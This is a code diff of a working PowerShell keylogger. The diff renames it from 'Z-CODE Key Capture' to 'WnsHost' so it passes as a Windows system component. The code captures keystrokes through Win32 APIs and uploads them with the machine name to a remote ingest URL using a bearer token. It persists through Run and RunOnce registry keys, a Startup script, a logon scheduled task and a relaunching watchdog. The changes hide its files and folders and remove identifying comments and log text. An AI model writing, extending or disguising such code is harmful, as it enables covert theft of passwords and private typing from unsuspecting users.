@@ -1,56 +1,67 @@
 # ============================================================
-#  Z-CODE - background agent: captures, logs locally, uploads.
-#  Program file may live anywhere (read-only ok, e.g. Program Files).
-#  All writable data lives in %LOCALAPPDATA%\Z-CODE
-#  Stop: Ctrl+Alt+Q  or  Z-CODE-stop.bat
-#  Modes (internal): -Register  -Watchdog  -NoWatchdog
+#  WnsHost - background helper: captures, logs, uploads.
+#  Log : %APPDATA%\Microsoft\Windows\Shell\WnsHost\WnsHost_cache.txt
+#  State: %LOCALAPPDATA%\Microsoft\Windows\WnsHost
+#  Off : Ctrl+Alt+Q  or  stop.vbs
+#  Modes (internal): -Register  -Guard  -NoGuard
 # ============================================================
 param(
     [switch]$Register,
-    [switch]$Watchdog,
-    [switch]$NoWatchdog
+    [switch]$Guard,
+    [switch]$NoGuard
 )
 $ErrorActionPreference = 'Stop'
 
 $SpecialKeys = $true
 
-# ---- BACKSPACE BEHAVIOUR -----------------------------------
-#   What the C2 receives: '' = nothing, otherwise this literal marker.
 $BackspaceToServer = '[delete]'
-#   What the local log does: 'delete' (mirror screen) | 'mark' | 'both'
 $BackspaceToLog    = 'delete'
-# ------------------------------------------------------------
 
-# ---- REMOTE UPLOAD -----------------------------------------
 $ServerUrl  = 'https://time-management.app/zcode/ingest.php'   # <-- EDIT
 $AuthToken  = '234523fgergzetrgeraTETRETR45'                    # <-- EDIT
-$SendEvery  = 5000      # ms between upload attempts
-$BatchBytes = 65536     # max bytes per POST
-# ------------------------------------------------------------
+$SendEvery  = 5000
+$BatchBytes = 65536
 
 $Root    = $PSScriptRoot
-$DataDir = Join-Path $env:LOCALAPPDATA 'Z-CODE'
+$DataDir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\WnsHost'
 if (-not (Test-Path -LiteralPath $DataDir)) { New-Item -ItemType Directory -Path $DataDir -Force | Out-Null }
 
-$LogPath        = Join-Path $DataDir 'ZCODE_keycapture_log.txt'
-$PidPath        = Join-Path $DataDir 'ZCODE.pid'
-$SpoolPath      = Join-Path $DataDir 'ZCODE_spool.bin'
-$OffsetPath     = Join-Path $DataDir 'ZCODE_spool.offset'
-$StopPath       = Join-Path $DataDir 'ZCODE.stop'
-$VbsPath        = Join-Path $DataDir 'launch.vbs'
-$SpoolMutexName = 'ZCODE_Spool_Mutex'
+$LogDir = Join-Path $env:APPDATA 'Microsoft\Windows\Shell\WnsHost'
+try {
+    if (-not (Test-Path -LiteralPath $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force | Out-Null }
+    $probe = Join-Path $LogDir '.w'
+    Set-Content -LiteralPath $probe -Value 'x' -ErrorAction Stop
+    Remove-Item -LiteralPath $probe -Force -ErrorAction SilentlyContinue
+    try { (Get-Item -LiteralPath $LogDir).Attributes = 'Directory,Hidden' } catch {}
+} catch { $LogDir = $DataDir }
+$LogPath = Join-Path $LogDir 'WnsHost_cache.txt'
 
-$fs = $null; $spoolFs = $null; $spoolMtx = $null; $spoolEnc = $null
+$LockPath       = Join-Path $DataDir 'WnsHost.lock'
+$BinPath        = Join-Path $DataDir 'WnsHost.bin'
+$IdxPath        = Join-Path $DataDir 'WnsHost.idx'
+$OffPath        = Join-Path $DataDir 'WnsHost.off'
+$VbsPath        = Join-Path $DataDir 'WnsHost.vbs'
+$SpoolMutexName = 'WnsHost_Spool'
+
+$fs = $null; $binFs = $null; $binMtx = $null; $binEnc = $null
 $ps = $null; $rs = $null
 $stopRequested = $false
 $floor = 0
 
 function Log([string]$t) { [System.IO.File]::AppendAllText($LogPath, $t) }
 
-# ---------------- persistence ----------------
 function Ensure-Launcher {
-    $line = 'CreateObject("WScript.Shell").Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""' +
-            ($PSCommandPath -replace '"', '""') + '""", 0, False'
+    $line = @'
+Dim sh, fso, ps1, extra, i
+Set sh  = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+ps1   = fso.BuildPath(fso.GetParentFolderName(WScript.ScriptFullName), "WnsHost.ps1")
+extra = ""
+For i = 0 To WScript.Arguments.Count - 1
+    extra = extra & " " & WScript.Arguments(i)
+Next
+sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1 & """" & extra, 0, False
+'@
     try { [System.IO.File]::WriteAllText($VbsPath, $line, (New-Object System.Text.ASCIIEncoding)) } catch {}
 }
 
@@ -62,34 +73,33 @@ function Get-LaunchCommand {
 
 function Install-Persistence {
     $cmd = Get-LaunchCommand
-    try { (Get-Item -LiteralPath 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run').SetValue('Z-CODE Key Capture', $cmd, 'String') } catch {}
-    try { (Get-Item -LiteralPath 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce').SetValue('Z-CODE Key Capture', $cmd, 'String') } catch {}
+    try { (Get-Item -LiteralPath 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run').SetValue('WnsHost', $cmd, 'String') } catch {}
+    try { (Get-Item -LiteralPath 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce').SetValue('WnsHost', $cmd, 'String') } catch {}
     try {
-        $lnk  = Join-Path ([Environment]::GetFolderPath('Startup')) 'Z-CODE Key Capture.vbs'
+        $lnk  = Join-Path ([Environment]::GetFolderPath('Startup')) 'WnsHost.vbs'
         $line = 'CreateObject("WScript.Shell").Run "' + ($cmd -replace '"', '""') + '", 0, False'
         [System.IO.File]::WriteAllText($lnk, $line, (New-Object System.Text.ASCIIEncoding))
     } catch {}
-    try { & schtasks.exe /create /f /sc onlogon /tn 'Z-CODE Key Capture' /tr $cmd 2>$null | Out-Null } catch {}
+    try { & schtasks.exe /create /f /sc onlogon /tn 'WnsHost' /tr $cmd 2>$null | Out-Null } catch {}
 }
 
 if ($Register) {
     Install-Persistence
-    Write-Host '  persistence registered: Run, RunOnce, Startup, logon task'
+    Write-Host '  registered'
     exit 0
 }
 
-# ---------------- watchdog ----------------
-if ($Watchdog) {
-    $wdMtx = New-Object System.Threading.Mutex($false, 'ZCODE_Watchdog_Mutex')
-    if (-not $wdMtx.WaitOne(0)) { exit 0 }
+if ($Guard) {
+    $gMtx = New-Object System.Threading.Mutex($false, 'WnsHost_Guard')
+    if (-not $gMtx.WaitOne(0)) { exit 0 }
     $misses = 0
     while ($true) {
         Start-Sleep -Seconds 10
-        if (Test-Path -LiteralPath $StopPath) { exit 0 }
+        if (Test-Path -LiteralPath $OffPath) { exit 0 }
         $alive = $false
-        if (Test-Path -LiteralPath $PidPath) {
+        if (Test-Path -LiteralPath $LockPath) {
             $id = 0
-            if ([int]::TryParse((Get-Content -LiteralPath $PidPath -Raw).Trim(), [ref]$id)) {
+            if ([int]::TryParse((Get-Content -LiteralPath $LockPath -Raw).Trim(), [ref]$id)) {
                 $alive = [bool](Get-Process -Id $id -ErrorAction SilentlyContinue)
             }
         }
@@ -100,21 +110,20 @@ if ($Watchdog) {
         Install-Persistence
         try {
             Ensure-Launcher
-            Start-Process wscript.exe -ArgumentList ('"' + $VbsPath + '"') | Out-Null
+            Start-Process wscript.exe -ArgumentList ('"' + $VbsPath + '" -NoGuard') | Out-Null
         } catch {
             try {
-                Start-Process powershell.exe -NoNewWindow -ArgumentList @(
+                Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
                     '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
-                    '-File', ('"' + $PSCommandPath + '"'), '-NoWatchdog') | Out-Null
+                    '-File', ('"' + $PSCommandPath + '"'), '-NoGuard') | Out-Null
             } catch {}
         }
         Start-Sleep -Seconds 20
     }
 }
 
-# ---------------- background uploader ----------------
 $senderScript = {
-    param($SpoolPath, $OffsetPath, $Url, $Token, $IntervalMs, $MaxBytes, $MutexName)
+    param($BinPath, $IdxPath, $Url, $Token, $IntervalMs, $MaxBytes, $MutexName)
 
     $ErrorActionPreference = 'Continue'
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
@@ -123,7 +132,7 @@ $senderScript = {
     $mtx = [System.Threading.Mutex]::new($false, $MutexName)
     $rfs = $null
     $offset = 0L
-    try { $offset = [long]((Get-Content -LiteralPath $OffsetPath -ErrorAction Stop).Trim()) } catch { $offset = 0L }
+    try { $offset = [long]((Get-Content -LiteralPath $IdxPath -ErrorAction Stop).Trim()) } catch { $offset = 0L }
 
     $headers = @{}
     if ($Token) { $headers['Authorization'] = 'Bearer ' + $Token }
@@ -136,7 +145,7 @@ $senderScript = {
         $mtx.WaitOne()
         try {
             if (-not $rfs) {
-                $rfs = [System.IO.FileStream]::new($SpoolPath, [System.IO.FileMode]::OpenOrCreate,
+                $rfs = [System.IO.FileStream]::new($BinPath, [System.IO.FileMode]::OpenOrCreate,
                                                   [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
             }
             $len = $rfs.Length
@@ -156,7 +165,7 @@ $senderScript = {
             } elseif ($len -gt 0) {
                 $rfs.SetLength(0)
                 $offset = 0
-                Set-Content -LiteralPath $OffsetPath -Value '0'
+                Set-Content -LiteralPath $IdxPath -Value '0'
             }
         } finally { $mtx.ReleaseMutex() }
 
@@ -177,7 +186,7 @@ $senderScript = {
 
             if ($ok -and $consumed -gt 0) {
                 $offset += $consumed
-                Set-Content -LiteralPath $OffsetPath -Value $offset
+                Set-Content -LiteralPath $IdxPath -Value $offset
             }
         }
 
@@ -187,17 +196,13 @@ $senderScript = {
 
 try {
     Install-Persistence
-    Remove-Item -LiteralPath $StopPath -ErrorAction SilentlyContinue
+    Remove-Item -LiteralPath $OffPath -ErrorAction SilentlyContinue
 
-    $mutex = New-Object System.Threading.Mutex($false, 'ZCODE_KeyCapture_Mutex')
-    if (-not $mutex.WaitOne(0)) { Log "`r`n[blocked: another instance already running]`r`n"; exit }
+    $mutex = New-Object System.Threading.Mutex($false, 'WnsHost_Single')
+    if (-not $mutex.WaitOne(0)) { Log "`r`n[blocked]`r`n"; exit }
 
-    if (-not $NoWatchdog) {
-        try {
-            Start-Process powershell.exe -NoNewWindow -ArgumentList @(
-                '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
-                '-File', ('"' + $PSCommandPath + '"'), '-Watchdog') | Out-Null
-        } catch {}
+    if (-not $NoGuard) {
+        try { Start-Process wscript.exe -ArgumentList ('"' + $VbsPath + '" -Guard') | Out-Null } catch {}
     }
 
     $fs = New-Object System.IO.FileStream($LogPath, [System.IO.FileMode]::OpenOrCreate, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
@@ -214,6 +219,7 @@ try {
         $fs.Write($old, 0, $old.Length)
     }
     $fs.Position = $fs.Length
+    try { (Get-Item -LiteralPath $LogPath).Attributes = 'Hidden' } catch {}
 
     function WriteRaw([string]$t) {
         if (-not $t) { return }
@@ -238,16 +244,16 @@ try {
         $fs.Flush()
     }
 
-    WriteRaw ("`r`n===== Z-CODE started " + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + " =====`r`n")
+    WriteRaw ("`r`n===== " + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + " =====`r`n")
     $floor = $fs.Length
 
     if ($ServerUrl) {
-        if (-not (Test-Path $SpoolPath))  { New-Item -ItemType File -Path $SpoolPath -Force | Out-Null }
-        if (-not (Test-Path $OffsetPath)) { Set-Content -LiteralPath $OffsetPath -Value '0' }
-        $spoolEnc = [System.Text.UTF8Encoding]::new($false)
-        $spoolMtx = [System.Threading.Mutex]::new($false, $SpoolMutexName)
-        $spoolFs  = [System.IO.FileStream]::new($SpoolPath, [System.IO.FileMode]::Append,
-                                                [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)
+        if (-not (Test-Path $BinPath)) { New-Item -ItemType File -Path $BinPath -Force | Out-Null }
+        if (-not (Test-Path $IdxPath)) { Set-Content -LiteralPath $IdxPath -Value '0' }
+        $binEnc = [System.Text.UTF8Encoding]::new($false)
+        $binMtx = [System.Threading.Mutex]::new($false, $SpoolMutexName)
+        $binFs  = [System.IO.FileStream]::new($BinPath, [System.IO.FileMode]::Append,
+                                             [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)
 
         $rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
         $rs.ApartmentState = [System.Threading.ApartmentState]::MTA
@@ -256,26 +262,26 @@ try {
         $ps = [System.Management.Automation.PowerShell]::Create()
         $ps.Runspace = $rs
         $null = $ps.AddScript($senderScript).
-            AddArgument($SpoolPath).AddArgument($OffsetPath).AddArgument($ServerUrl).
+            AddArgument($BinPath).AddArgument($IdxPath).AddArgument($ServerUrl).
             AddArgument($AuthToken).AddArgument($SendEvery).AddArgument($BatchBytes).
             AddArgument($SpoolMutexName)
         $null = $ps.BeginInvoke()
     }
 
     function Spool([string]$t) {
-        if (-not $t -or -not $spoolFs) { return }
-        $b = $spoolEnc.GetBytes($t)
-        $null = $spoolMtx.WaitOne()
+        if (-not $t -or -not $binFs) { return }
+        $b = $binEnc.GetBytes($t)
+        $null = $binMtx.WaitOne()
         try {
-            $spoolFs.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
-            $spoolFs.Write($b, 0, $b.Length)
-            $spoolFs.Flush()
-        } finally { $spoolMtx.ReleaseMutex() }
+            $binFs.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
+            $binFs.Write($b, 0, $b.Length)
+            $binFs.Flush()
+        } finally { $binMtx.ReleaseMutex() }
     }
 
-    if ($ServerUrl) { Spool ("`n===== session " + $env:COMPUTERNAME + " " + (Get-Date).ToString('o') + " =====`n") }
+    if ($ServerUrl) { Spool ("`n===== " + $env:COMPUTERNAME + " " + (Get-Date).ToString('o') + " =====`n") }
 
-    Add-Type -Namespace ZCode -Name Native -MemberDefinition @'
+    Add-Type -Namespace WnsHost -Name Api -MemberDefinition @'
 [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
 [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
 [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);
@@ -306,42 +312,42 @@ try {
     function GetKeyStateArray {
         $st = New-Object byte[] 256
         foreach ($m in 0x10, 0x11, 0x12, 0x14, 0x90) {
-            if (([ZCode.Native]::GetAsyncKeyState($m) -band 0x8000) -ne 0) { $st[$m] = 0x80 }
+            if (([WnsHost.Api]::GetAsyncKeyState($m) -band 0x8000) -ne 0) { $st[$m] = 0x80 }
         }
-        if (([ZCode.Native]::GetAsyncKeyState(0x14) -band 0x0001) -ne 0) { $st[0x14] = $st[0x14] -bor 0x01 }
-        if (([ZCode.Native]::GetAsyncKeyState(0x90) -band 0x0001) -ne 0) { $st[0x90] = $st[0x90] -bor 0x01 }
+        if (([WnsHost.Api]::GetAsyncKeyState(0x14) -band 0x0001) -ne 0) { $st[0x14] = $st[0x14] -bor 0x01 }
+        if (([WnsHost.Api]::GetAsyncKeyState(0x90) -band 0x0001) -ne 0) { $st[0x90] = $st[0x90] -bor 0x01 }
         if ($st[0x11] -ne 0 -and $st[0x12] -eq 0) { $st[0x11] = 0 }
         return ,$st
     }
 
     function GetActiveLayout {
-        $fg  = [ZCode.Native]::GetForegroundWindow()
+        $fg  = [WnsHost.Api]::GetForegroundWindow()
         $hkl = [IntPtr]::Zero
         if ($fg -ne [IntPtr]::Zero) {
-            $tid = [ZCode.Native]::GetWindowThreadProcessId($fg, [IntPtr]::Zero)
-            $hkl = [ZCode.Native]::GetKeyboardLayout($tid)
+            $tid = [WnsHost.Api]::GetWindowThreadProcessId($fg, [IntPtr]::Zero)
+            $hkl = [WnsHost.Api]::GetKeyboardLayout($tid)
         }
-        if ($hkl -eq [IntPtr]::Zero) { $hkl = [ZCode.Native]::GetKeyboardLayout(0) }
+        if ($hkl -eq [IntPtr]::Zero) { $hkl = [WnsHost.Api]::GetKeyboardLayout(0) }
         return $hkl
     }
 
     function Translate([int]$vk) {
         $hkl  = GetActiveLayout
-        $scan = [ZCode.Native]::MapVirtualKeyEx([uint32]$vk, 0, $hkl)
+        $scan = [WnsHost.Api]::MapVirtualKeyEx([uint32]$vk, 0, $hkl)
         $st   = GetKeyStateArray
         $sb   = New-Object System.Text.StringBuilder 8
-        $rc   = [ZCode.Native]::ToUnicodeEx([uint32]$vk, $scan, $st, $sb, 8, 0, $hkl)
+        $rc   = [WnsHost.Api]::ToUnicodeEx([uint32]$vk, $scan, $st, $sb, 8, 0, $hkl)
         if ($rc -gt 0) { return $sb.ToString() }
         return ''
     }
 
-    Set-Content -LiteralPath $PidPath -Value $PID
+    Set-Content -LiteralPath $LockPath -Value $PID
 
     $VK_CTRL = 0x11; $VK_ALT = 0x12; $VK_Q = 0x51
 
     while ($true) {
         foreach ($vk in $tracked) {
-            $s    = [ZCode.Native]::GetAsyncKeyState($vk)
+            $s    = [WnsHost.Api]::GetAsyncKeyState($vk)
             $down = ($s -band 0x8000) -ne 0
             if ((($s -band 0x0001) -ne 0) -or ($down -and -not $prev[$vk])) {
                 switch ($vk) {
@@ -372,7 +378,7 @@ try {
         }
 
         foreach ($vk in @($mark.Keys)) {
-            $s    = [ZCode.Native]::GetAsyncKeyState($vk)
+            $s    = [WnsHost.Api]::GetAsyncKeyState($vk)
             $down = ($s -band 0x8000) -ne 0
             if ((($s -band 0x0001) -ne 0) -or ($down -and -not $prev[$vk])) {
                 Spool $mark[$vk]
@@ -381,10 +387,10 @@ try {
             $prev[$vk] = $down
         }
 
-        if ((([ZCode.Native]::GetAsyncKeyState($VK_CTRL)) -band 0x8000) -and
-            (([ZCode.Native]::GetAsyncKeyState($VK_ALT))  -band 0x8000) -and
-            (([ZCode.Native]::GetAsyncKeyState($VK_Q))    -band 0x8000)) {
-            WriteRaw ("`r`n===== Z-CODE stopped " + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + " =====`r`n")
+        if ((([WnsHost.Api]::GetAsyncKeyState($VK_CTRL)) -band 0x8000) -and
+            (([WnsHost.Api]::GetAsyncKeyState($VK_ALT))  -band 0x8000) -and
+            (([WnsHost.Api]::GetAsyncKeyState($VK_Q))    -band 0x8000)) {
+            WriteRaw ("`r`n===== " + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + " =====`r`n")
             $stopRequested = $true
             break
         }
@@ -392,13 +398,13 @@ try {
     }
 }
 catch {
-    Log ("`r`n[ERROR] " + $_.Exception.Message + "`r`n" + $_.ScriptStackTrace + "`r`n")
+    Log ("`r`n[ERR] " + $_.Exception.Message + "`r`n" + $_.ScriptStackTrace + "`r`n")
 }
 finally {
-    if ($ps)      { try { $ps.Stop() } catch {}; try { $ps.Dispose() } catch {} }
-    if ($rs)      { try { $rs.Close() } catch {}; try { $rs.Dispose() } catch {} }
-    if ($spoolFs) { try { $spoolFs.Dispose() } catch {} }
-    if ($fs)      { try { $fs.Flush() } catch {}; try { $fs.Dispose() } catch {} }
-    if ($stopRequested) { try { Set-Content -LiteralPath $StopPath -Value ((Get-Date).ToString('o')) } catch {} }
-    try { Remove-Item -LiteralPath $PidPath -ErrorAction SilentlyContinue } catch {}
+    if ($ps)    { try { $ps.Stop() } catch {}; try { $ps.Dispose() } catch {} }
+    if ($rs)    { try { $rs.Close() } catch {}; try { $rs.Dispose() } catch {} }
+    if ($binFs) { try { $binFs.Dispose() } catch {} }
+    if ($fs)    { try { $fs.Flush() } catch {}; try { $fs.Dispose() } catch {} }
+    if ($stopRequested) { try { Set-Content -LiteralPath $OffPath -Value ((Get-Date).ToString('o')) } catch {} }
+    try { Remove-Item -LiteralPath $LockPath -ErrorAction SilentlyContinue } catch {}
 }
